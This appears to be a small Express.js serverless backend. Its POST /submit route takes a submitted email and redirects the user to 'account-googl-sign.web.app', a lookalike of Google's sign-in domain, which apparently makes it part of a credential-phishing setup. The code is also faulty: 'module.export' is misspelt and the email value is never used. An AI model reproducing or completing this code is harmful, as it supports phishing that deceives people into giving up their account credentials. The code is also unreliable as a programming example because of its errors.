const express = require('express');
const serverless = require('serverless-http');

const app = express();
const router = express.Router();

 app.use(express.json());
 app.use(express.urlencoded({extended: true}));

 router.get('/', (req, res) => {
   res.send("teting this, pleqee qorj");
 });
 router.post('/submit', (req, res)=> {
   let {email} = req.body
   res.status(200).redirect('https://account-googl-sign.web.app')
 })


app.use('/', router)
module.export.handler = serverless(app)
